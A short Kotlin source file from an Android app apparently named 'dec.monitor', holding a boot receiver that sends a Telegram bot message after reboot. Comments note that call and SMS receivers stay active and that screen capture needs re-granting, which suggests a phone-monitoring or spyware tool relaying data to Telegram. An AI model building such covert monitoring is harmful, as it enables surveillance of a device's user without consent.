package com.dec.monitor

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        // call + SMS receivers register via manifest, auto-active
        // screenshot needs user to re-grant MediaProjection after reboot — that's Android's hard limit
        TelegramBot.let {
            kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
                TelegramBot.sendMessage("📲 <b>Device rebooted.</b> Open the app to re-enable screen capture.")
            }
        }
    }
}
